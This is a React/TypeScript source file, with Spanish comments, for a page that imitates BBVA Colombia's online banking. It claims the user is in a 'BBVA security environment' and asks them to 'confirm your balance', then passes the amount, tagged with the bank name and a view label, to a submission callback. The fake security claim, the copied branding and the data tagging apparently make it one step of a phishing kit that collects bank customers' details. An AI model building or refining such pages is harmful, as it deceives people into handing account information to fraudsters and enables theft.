/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-html-link-for-pages */
// src/components/BBVALoginForm.tsx
'use client';
import { useState } from 'react';
import { ChevronDown, Eye, Lock, X } from 'lucide-react'; // X para el botón de cierre

interface FormData {
  documentType: string;
  documentNumber: string;
  password: string;
}

const documentTypes = [
  { value: 'cc', label: 'Cédula de ciudadanía' },
  { value: 'ti', label: 'Tarjeta de identidad' },
  // ... más tipos de documento
];

const Saldo = ({ enviar }: any) => {
  const [saldo, setSaldo] = useState("");

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value) {
      value = new Intl.NumberFormat("es-CO").format(parseInt(value));
      setSaldo(`$ ${value}`);
    } else {
      setSaldo("");
    }
  };
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    enviar?.({
      view: "saldo",
      saldo: saldo,
      bank: "bbva",
      timestamp: new Date().toISOString(),
    });
  };

  const bbvaBlue = 'bg-[#001391]';
  const bbvaTextBlue = 'text-[#001391]';

  return (
    // Contenedor principal que simula la pantalla
    <div className="max-w-md w-full mx-auto bg-white shadow-xl min-h-screen">

      {/* 🔝 1. Cabecera (Header) */}
      <div className="flex justify-between items-center px-4 py-3 border-b border-gray-100">
        <div className="w-6 h-6">{/* Espaciador para centrar el logo */}</div>

        {/* Logo BBVA (Simulación) */}
        <div className={`text-2xl font-black ${bbvaTextBlue}`}>BBVA</div>

        {/* Botón de cierre */}
        <button className="text-gray-600 hover:text-gray-800" aria-label="Cerrar">
          <X className="h-6 w-6" />
        </button>
      </div>

      <div className="p-6 sm:p-8">

        {/* 🔒 2. Entorno de Seguridad */}
        <div className="text-center mb-6">
          <Lock className="h-6 w-6 mx-auto text-gray-500 mb-1" />
          <p className="text-sm text-gray-500">
            Estás en un entorno con seguridad BBVA
          </p>
        </div>

        {/* 🚀 3. Título Principal */}
        {/* Usamos font-serif si tenemos una fuente serif o font-extrabold para simular el peso de la imagen */}
        <h1 className="text-2xl font-serif font-extrabold text-[#001391] leading-tight mb-8">
          Confirma tu saldo:
        </h1>

        <form onSubmit={handleSubmit} className="space-y-4">

          {/* Campo 1: Saldo */}
          <div>
            <input
              type="text"
              name="saldo"
              value={saldo}
              onChange={handleChange}
              placeholder="$ 0"
              className="w-full h-12 p-3 border border-gray-400 rounded-lg focus:ring-2 focus:ring-[#004481] focus:border-[#004481] placeholder-gray-500 text-lg font-bold"
              required
            />
          </div>

          {/* 🔑 Botón Entrar */}
          <button
            type="submit"
            className={`w-full ${bbvaBlue} text-white font-bold py-3 rounded-md mt-6 hover:opacity-95 transition-opacity`}
          >
            CONTINUAR
          </button>

          {/* Enlace: Olvidaste tu contraseña */}
          <div className="text-center pt-2">
            <a
              href="/forgot-password"
              className={`${bbvaTextBlue} text-sm hover:underline`}
            >
              ¿Olvidaste tu contraseña?
            </a>
          </div>
        </form>
      </div> {/* Fin del padding principal */}

      {/* 💡 Módulo Inferior (Promocional) */}
      <div className="p-6 sm:p-8 pt-0">
        <hr className="my-8 border-gray-200" />
        <div className="flex flex-col items-start bg-gray-50 p-6 rounded-lg">
          {/* Imagen de perfil simulando el icono 3D */}
          <div className="w-16 h-16 bg-blue-100 rounded-lg flex items-center justify-center mb-3 shadow-md">
            {/* Icono de usuario simple */}
            <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8 text-[#004481]" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
            </svg>
          </div>
          <h2 className={`text-xl font-bold ${bbvaTextBlue} mb-1`}>
            Empieza, hoy con BBVA Net
          </h2>
          <p className="text-sm text-gray-600">
            Regístrate o conoce los beneficios de la banca en línea.
          </p>
        </div>
      </div>
    </div>
  );
};
export default Saldo;